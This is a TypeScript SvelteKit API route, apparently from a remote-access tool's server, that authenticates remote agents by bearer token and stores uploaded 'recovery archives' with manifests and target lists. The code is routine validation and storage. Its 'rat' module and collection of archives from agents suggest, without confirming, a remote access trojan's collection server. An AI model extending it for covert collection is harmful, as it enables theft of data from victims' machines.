import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { registry, RegistryError } from '$lib/server/rat/store';
import {
	RecoveryArchiveConflictError,
	RecoveryArchiveIntegrityError,
	RecoveryArchiveMetadataError,
	saveRecoveryArchive
} from '$lib/server/recovery/storage';
import {
	parseRecoveryManifestEntries,
	parseRecoveryTargetSummaries
} from '$lib/server/recovery/validation';
import type { RecoveryArchiveDetail } from '$lib/types/recovery';

function getBearerToken(header: string | null): string | undefined {
	if (!header) {
		return undefined;
	}
	const match = header.match(/^Bearer\s+(.+)$/i);
	return match?.[1]?.trim();
}

function normalizeWhitespace(value: string): string {
	let withSpaces = '';
	for (const char of value) {
		const code = char.charCodeAt(0);
		withSpaces += code >= 0 && code <= 31 ? ' ' : char;
	}
	return withSpaces.replace(/\s{2,}/g, ' ').trim();
}

function parseJsonField(value: FormDataEntryValue | null): unknown | undefined {
	if (typeof value !== 'string') {
		return undefined;
	}
	const trimmed = value.trim();
	if (!trimmed) {
		return undefined;
	}
	return JSON.parse(trimmed) as unknown;
}

function sanitizeOptionalText(value: FormDataEntryValue | null): string | undefined {
	if (typeof value !== 'string') {
		return undefined;
	}
	const normalized = normalizeWhitespace(value);
	return normalized.length > 0 ? normalized : undefined;
}

function sanitizeArchiveName(
	candidate: string | null,
	fallback: string,
	requestId: string
): string {
	const normalize = (input: string) => normalizeWhitespace(input);
	const preferred = candidate ? normalize(candidate) : '';
	if (preferred) {
		return preferred;
	}
	const fromFile = normalize(fallback);
	if (fromFile) {
		return fromFile;
	}
	return `Recovery archive ${requestId}`;
}

export const POST: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const token = getBearerToken(request.headers.get('authorization'));
	try {
		registry.authorizeAgent(id, token);
	} catch (err) {
		if (err instanceof RegistryError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Authorization failed');
	}

	const form = await request.formData();
	const file = form.get('archive');
	if (!(file instanceof File)) {
		throw error(400, 'Archive data missing');
	}

	const requestIdValue = form.get('requestId');
	if (typeof requestIdValue !== 'string' || requestIdValue.trim() === '') {
		throw error(400, 'Request identifier is required');
	}

	let manifest = [] as ReturnType<typeof parseRecoveryManifestEntries>;
	try {
		const manifestPayload = parseJsonField(form.get('manifest'));
		manifest = manifestPayload === undefined ? [] : parseRecoveryManifestEntries(manifestPayload);
	} catch (err) {
		const message = err instanceof Error ? err.message : 'Invalid manifest payload';
		throw error(400, `Invalid manifest payload: ${message}`);
	}

	let targets = [] as ReturnType<typeof parseRecoveryTargetSummaries>;
	try {
		const targetsPayload = parseJsonField(form.get('targets'));
		targets = targetsPayload === undefined ? [] : parseRecoveryTargetSummaries(targetsPayload);
	} catch (err) {
		const message = err instanceof Error ? err.message : 'Invalid targets payload';
		throw error(400, `Invalid targets payload: ${message}`);
	}

	const sha256Value = form.get('sha256');
	if (typeof sha256Value !== 'string' || sha256Value.trim() === '') {
		throw error(400, 'Archive checksum missing');
	}

	const notes = sanitizeOptionalText(form.get('notes'));
	const archiveNameValue = form.get('archiveName');
	const archiveName = sanitizeArchiveName(
		typeof archiveNameValue === 'string' ? archiveNameValue : null,
		file.name,
		requestIdValue.trim()
	);

	const buffer = new Uint8Array(await file.arrayBuffer());

	try {
		const archive = await saveRecoveryArchive({
			agentId: id,
			requestId: requestIdValue.trim(),
			archiveName,
			data: buffer,
			sha256: sha256Value.trim(),
			manifest,
			targets,
			notes
		});

		return json({ archive } satisfies { archive: RecoveryArchiveDetail });
	} catch (err) {
		if (err instanceof RecoveryArchiveIntegrityError) {
			throw error(400, err.message);
		}
		if (err instanceof RecoveryArchiveConflictError) {
			const message = err.existingArchiveId
				? `${err.message} (archive ${err.existingArchiveId})`
				: err.message;
			throw error(409, message);
		}
		if (err instanceof RecoveryArchiveMetadataError) {
			console.error('Invalid recovery archive metadata encountered', err);
			throw error(500, 'Existing recovery archives failed validation');
		}
		console.error('Failed to save recovery archive', err);
		throw error(500, 'Failed to save recovery archive');
	}
};
